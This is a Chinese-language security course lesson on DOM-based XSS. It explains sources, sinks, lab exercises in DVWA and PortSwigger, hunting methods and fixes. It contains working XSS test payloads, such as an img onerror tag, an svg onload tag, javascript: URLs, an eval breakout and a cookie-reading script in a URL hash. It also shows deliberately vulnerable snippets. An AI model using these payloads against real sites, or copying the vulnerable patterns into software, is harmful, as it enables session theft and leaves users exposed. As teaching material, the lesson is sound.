---
title: Day040：XSS 进阶 - DOM XSS 原理与挖掘
tags:
  - 网络安全
  - XSS
  - DOM XSS
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d040
date: 2026-03-03
updated: 2026-01-28
---

# Day040：XSS 进阶 - DOM XSS 原理与挖掘

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | DOM XSS 原理与挖掘 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你用 Burp 抓包分析了半天，发现服务器返回的 HTML 完全没有问题，但浏览器里却出现了 XSS！
>
> **问题**：恶意代码不在服务器响应里，那它是从哪来的？
>
> **今天的任务**：学习 DOM XSS——发生在浏览器端的"隐形杀手"。

---

## 今日目标

- [ ] 理解 DOM XSS 与反射型/存储型 XSS 的区别
- [ ] 掌握 Source 和 Sink 的概念
- [ ] 学会挖掘 DOM XSS 漏洞
- [ ] 完成 DOM XSS 实战

**闯关条件**：找到并利用一个 DOM XSS 漏洞。

---

## 实战任务（先动手！）

### 任务 1：理解 DOM XSS（20 分钟）

**三种 XSS 对比**：

| 类型 | 恶意代码位置 | 服务器参与 | 检测难度 |
|------|--------------|------------|----------|
| 反射型 XSS | 服务器响应 HTML | 是 | 易 |
| 存储型 XSS | 数据库→服务器响应 | 是 | 易 |
| DOM XSS | 浏览器 JS 动态生成 | 否 | 难 |

**DOM XSS 流程**：
```
URL 参数 → JavaScript 读取 → 不安全地写入 DOM → XSS 触发
```

**关键概念**：
- **Source（源）**：用户可控的输入来源
- **Sink（汇）**：危险的 DOM 操作函数

**记录**：
```
DOM XSS 的特点：________________
```

---

### 任务 2：识别常见 Source（25 分钟）

**URL 相关 Source**：
```javascript
location.href
location.search      // ?id=xxx
location.hash        // #xxx
location.pathname
document.URL
document.documentURI
document.baseURI
```

**存储相关 Source**：
```javascript
document.cookie
localStorage.getItem()
sessionStorage.getItem()
```

**消息相关 Source**：
```javascript
window.name
postMessage 的 event.data
```

**动手测试**：
```javascript
// 在浏览器控制台测试
console.log(location.search);
console.log(location.hash);

// 访问 http://example.com?test=hello#world
// 观察输出
```

**记录**：
```
常用的 Source 列表：________________
```

---

### 任务 3：识别常见 Sink（25 分钟）

**最危险的 Sink（直接执行代码）**：
```javascript
eval()
Function()
setTimeout(string)
setInterval(string)
```

**HTML 注入 Sink**：
```javascript
element.innerHTML =
element.outerHTML =
document.write()
document.writeln()
```

**URL 跳转 Sink**：
```javascript
location =
location.href =
location.assign()
location.replace()
```

**jQuery Sink**：
```javascript
$(selector).html()
$(selector).append()
$(userInput)  // jQuery 选择器注入
```

**记录**：
```
最危险的 Sink：________________
```

---

### 任务 4：DOM XSS 实战（50 分钟）

**环境**：DVWA - XSS (DOM) 或 PortSwigger Web Security Academy

**场景 1：location.hash 注入**

```html
<!-- 漏洞代码 -->
<script>
  var lang = location.hash.substring(1);
  document.getElementById('content').innerHTML =
    'Selected language: ' + lang;
</script>
```

**攻击 Payload**：
```
http://target.com/page.html#<img src=x onerror=alert(1)>
```

**场景 2：location.search 注入**

```html
<!-- 漏洞代码 -->
<script>
  var params = new URLSearchParams(location.search);
  var name = params.get('name');
  document.write('Hello, ' + name);
</script>
```

**攻击 Payload**：
```
http://target.com/page.html?name=<script>alert(1)</script>
```

**场景 3：jQuery 选择器注入**

```javascript
// 漏洞代码
var id = location.hash.substring(1);
$(id).css('color', 'red');
```

**攻击 Payload**：
```
http://target.com/page.html#<img src=x onerror=alert(1)>
```

**记录**：
```
成功利用的 Payload：________________
漏洞代码分析：________________
```

---

### 任务 5：DOM XSS 挖掘方法（30 分钟）

**方法 1：手动代码审计**

1. 搜索危险 Sink：
```javascript
// 在浏览器 DevTools 的 Sources 面板搜索
innerHTML
document.write
eval
location =
```

2. 追溯数据来源，判断是否可控

**方法 2：浏览器 DevTools**

1. 设置 DOM 断点
2. 观察 DOM 变化
3. 追踪调用栈

**方法 3：自动化工具**

```bash
# DOM XSS 扫描器
# 使用 Burp Suite 的 DOM Invader（内置于 Burp Browser）
```

**记录**：
```
使用的挖掘方法：________________
发现的可疑点：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 DOM XSS 原理 | 20 分 |
| 能识别常见 Source | 20 分 |
| 能识别常见 Sink | 20 分 |
| 成功利用 DOM XSS | 25 分 |
| 掌握挖掘方法 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### DOM XSS 为什么难发现？

```
传统 XSS 检测流程：
请求 → 服务器处理 → 响应 → 检查响应中是否有恶意代码
                              ↑
                         DOM XSS 不在这里！

DOM XSS 执行流程：
响应（干净的 HTML） → 浏览器执行 JS → JS 读取用户输入 → 写入 DOM
                                                    ↑
                                              这里才产生 XSS
```

### Source → Sink 完整链路

```javascript
// 示例：完整的 DOM XSS 漏洞

// 1. Source：用户可控的 URL 片段
var userInput = location.hash.substring(1);

// 2. 没有任何过滤或编码
// （漏洞关键点）

// 3. Sink：危险的 DOM 操作
document.getElementById('output').innerHTML = userInput;

// 攻击者构造：
// http://target.com/page#<script>alert(document.cookie)</script>
```

### 常见漏洞模式

**模式 1：URL 片段直接写入**
```javascript
// 漏洞
element.innerHTML = location.hash;

// 修复
element.textContent = location.hash;
```

**模式 2：eval 执行用户输入**
```javascript
// 漏洞
eval('var data = ' + userInput);

// 修复
var data = JSON.parse(userInput);
```

**模式 3：动态创建链接**
```javascript
// 漏洞
link.href = 'javascript:' + userInput;

// 修复
if (userInput.match(/^https?:\/\//)) {
  link.href = userInput;
}
```

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Hash 需要 URL 解码 | `#%3Cscript%3E` 不执行 | 某些情况需要 `decodeURIComponent` |
| CSP 阻止 inline | Payload 不执行 | 检查 CSP 头，可能需要其他利用方式 |
| Payload 被编码 | 看到源码但不执行 | 确认 Sink 类型，innerHTML vs textContent |
| 抓包看不到 | 服务器响应没问题 | DOM XSS 只在浏览器端发生，用 DevTools 调试 |

---

## 知识卡片速查

### DOM XSS 速查表

**常见 Source**：
```javascript
location.href / search / hash / pathname
document.URL / cookie
window.name
postMessage event.data
localStorage / sessionStorage
```

**危险 Sink**：
```javascript
// 执行代码
eval() / Function() / setTimeout(str) / setInterval(str)

// 修改 HTML
innerHTML / outerHTML / document.write()

// 跳转
location = / location.href = / location.assign()

// jQuery
$().html() / $().append() / $(userInput)
```

### 快速测试 Payload

```javascript
// 测试 innerHTML Sink
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

// 测试 href Sink
javascript:alert(1)

// 测试 eval Sink
';alert(1)//
```

---

## 常见问题

**Q1：DOM XSS 和反射型 XSS 有什么本质区别？**

A1：
- 反射型：恶意代码由服务器"反射"回来
- DOM XSS：恶意代码完全在浏览器端产生，服务器"无辜"
- 检测方式完全不同：反射型看响应，DOM XSS 需要分析 JS 代码

**Q2：innerHTML 和 textContent 有什么区别？**

A2：
- `innerHTML`：会解析 HTML 标签，可能导致 XSS
- `textContent`：只作为纯文本处理，安全

```javascript
element.innerHTML = '<script>alert(1)</script>';  // XSS！
element.textContent = '<script>alert(1)</script>'; // 安全，显示文本
```

**Q3：如何快速判断是否存在 DOM XSS？**

A3：
1. 修改 URL 参数/hash，看页面是否变化
2. 如果变化了，查看是服务器响应变化还是 JS 动态修改
3. 如果是 JS 修改，追踪代码找 Sink

---

## 明日预告

**Day 041：CSRF 原理与攻击链构造**

明天你将：
- 理解 CSRF 的攻击原理
- 学习 CSRF 攻击链的构造
- 掌握 CSRF Token 绕过技巧

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 发现的 DOM XSS | |
| 使用的 Source/Sink | |
| 今日收获 | |

---

> **导师点评**：
>
> DOM XSS 是"隐形杀手"——服务器日志看不到，WAF 拦不住，传统扫描器找不到。
>
> 这就是为什么 DOM XSS 在现代 SPA（单页应用）中越来越常见：前端框架 React、Vue、Angular 都在浏览器端处理大量逻辑。
>
> 学会 DOM XSS，你就掌握了一把钥匙，能打开很多"看起来安全"的门。
>
> **记住：数据流分析是安全审计的核心技能**。

```bash
echo "Day 040 Complete! DOM XSS 挖掘入门！"
```
